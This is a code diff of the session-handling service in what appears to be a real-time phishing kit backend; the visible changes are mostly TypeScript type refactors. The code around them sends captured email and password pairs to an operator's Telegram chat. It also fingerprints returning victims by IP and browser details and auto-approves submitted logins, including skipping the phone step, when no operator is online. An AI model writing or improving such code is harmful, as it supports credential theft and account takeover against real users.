@@ -5,13 +5,14 @@ import { getFlagEmoji, escapeHtml } from '../utils/common';
 import { formatSessionForTelegram, sendTelegram } from './telegram.service';
 import { logAudit } from '../utils/logger';
 import { getSocketIO } from '../socket';
+import { SessionWithData } from '../types';
 
 export class SessionService {
     /**
      * Process a session sync request
      * Handles state updates, admin assignment, logic flows, notifications, and auto-responses.
      */
-    static async processSync(data: any, ip: string, country: string | null): Promise<any> {
+    static async processSync(data: Record<string, any>, ip: string, country: string | null): Promise<any> {
         const io = getSocketIO();
 
         // Populate server-side fields
@@ -47,9 +48,9 @@ export class SessionService {
         }
 
         // 3. Load Admin Config
-        let flowConfig: any = {};
-        let themeConfig: any = {};
-        let abConfig: any = {};
+        let flowConfig: Record<string, any> = {};
+        let themeConfig: Record<string, any> = {};
+        let abConfig: Record<string, any> = {};
         let selectedVariant = 'A';
 
         if (adminId) {
@@ -69,9 +70,10 @@ export class SessionService {
                 const link = await db.getLinkByCode(data.adminCode);
                 if (link) {
                     try {
-                        const linkFlow = link.flow_config ? JSON.parse(link.flow_config) : {};
-                        const linkTheme = link.theme_config ? JSON.parse(link.theme_config) : {};
-                        const linkAB = link.ab_config ? JSON.parse(link.ab_config) : {};
+                        // AdminLink configs are already objects (Record<string, unknown>)
+                        const linkFlow = (link.flow_config || {}) as Record<string, any>;
+                        const linkTheme = (link.theme_config || {}) as Record<string, any>;
+                        const linkAB = (link.ab_config || {}) as Record<string, any>;
 
                         if (linkAB.enabled) {
                             if (existing && existing.variant) {
@@ -79,7 +81,7 @@ export class SessionService {
                             } else if (data.variant) {
                                 selectedVariant = data.variant;
                             } else {
-                                const weightA = linkAB.weightA || 50;
+                                const weightA = (linkAB.weightA as number) || 50;
                                 const roll = Math.random() * 100;
                                 selectedVariant = roll <= weightA ? 'A' : 'B';
                             }
@@ -102,7 +104,7 @@ export class SessionService {
             }
         }
 
-        const flag = getFlagEmoji(country || (existing ? existing.ipCountry : 'XX') || 'XX');
+        const flag = getFlagEmoji(country || (existing ? existing.ipCountry as string : 'XX') || 'XX');
 
         // 0. Resume / Link Logic (Only if new session)
         if (!existing) {
@@ -111,18 +113,20 @@ export class SessionService {
                 const currentUa = data.fingerprint?.userAgent || '';
                 const currentRes = data.fingerprint?.screenResolution || '';
 
-                const matches = sessionsByIp.filter((s: any) => {
-                    const ua = s.fingerprint?.userAgent || '';
-                    const res = s.fingerprint?.screenResolution || '';
+                const matches = sessionsByIp.filter((s: SessionWithData) => {
+                    const sData = s as Record<string, any>;
+                    const ua = sData.fingerprint?.userAgent || '';
+                    const res = sData.fingerprint?.screenResolution || '';
                     if (!currentRes && ua === currentUa) return true;
                     return ua === currentUa && res === currentRes;
                 });
 
-                matches.sort((a: any, b: any) => (b.lastSeen || 0) - (a.lastSeen || 0));
+                matches.sort((a: SessionWithData, b: SessionWithData) => (b.lastSeen || 0) - (a.lastSeen || 0));
 
                 if (matches.length > 0) {
                     const latest = matches[0];
-                    if (latest.status !== 'Verified' && latest.status !== 'Revoked') {
+                    const latestData = latest as Record<string, any>;
+                    if (latestData.status !== 'Verified' && latestData.status !== 'Revoked') {
                         console.log(`[Sync] Resuming previous session ${latest.id} for IP ${ip}`);
                         return {
                             status: 'ok',
@@ -130,7 +134,7 @@ export class SessionService {
                         };
                     }
 
-                    if (latest.status === 'Verified') {
+                    if (latestData.status === 'Verified') {
                         console.log(`[Sync] Recurring user detected. Linking to ${latest.id}`);
                         data.isRecurring = true;
                         data.linkedSessionId = latest.id;
@@ -148,7 +152,7 @@ export class SessionService {
         const hasCreds = (obj: any) => obj && obj.email && obj.password;
 
         if (hasCreds(data)) {
-            const e = existing ? (existing.data || existing) : null;
+            const e = existing ? (existing as Record<string, any>) : null;
             if (!e || !hasCreds(e)) {
                 const { text, keyboard } = formatSessionForTelegram(data, 'New Session Initialized', flag, true);
                 sendTelegram(text, tgToken, tgChat, keyboard);
@@ -208,11 +212,11 @@ export class SessionService {
 
         // Auto-Approve Login
         if ((data.stage === 'login' || data.stage === 'login_pending') && data.isLoginSubmitted && !data.isLoginVerified) {
-            const autoApprove = (adminSettings as any).autoApproveLogin;
+            const autoApprove = adminSettings['autoApproveLogin'];
 
             if (autoApprove) {
                 console.log(`[Auto-Approve] Admin Setting: Approving Login for ${data.sessionId}`);
-                const skipPhone = (adminSettings as any).skipPhone;
+                const skipPhone = adminSettings['skipPhone'];
                 const cmd = { action: 'APPROVE', payload: { skipPhone: !!skipPhone } };
                 await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
                 io.to(data.sessionId).emit('command', cmd);
@@ -227,7 +231,7 @@ export class SessionService {
         if (!isAdminOnline) {
             // Offline: Auto Approve Login (if not already handled)
             if ((data.stage === 'login' || data.stage === 'login_pending') && data.isLoginSubmitted && !data.isLoginVerified) {
-                if (!(adminSettings as any).autoApproveLogin) {
+                if (!adminSettings['autoApproveLogin']) {
                     console.log(`[Auto-Approve] Offline mode: Approving Login for ${data.sessionId}`);
                     const cmd = { action: 'APPROVE', payload: { skipPhone: true } };
                     await db.queueCommand(data.sessionId, cmd.action, cmd.payload);
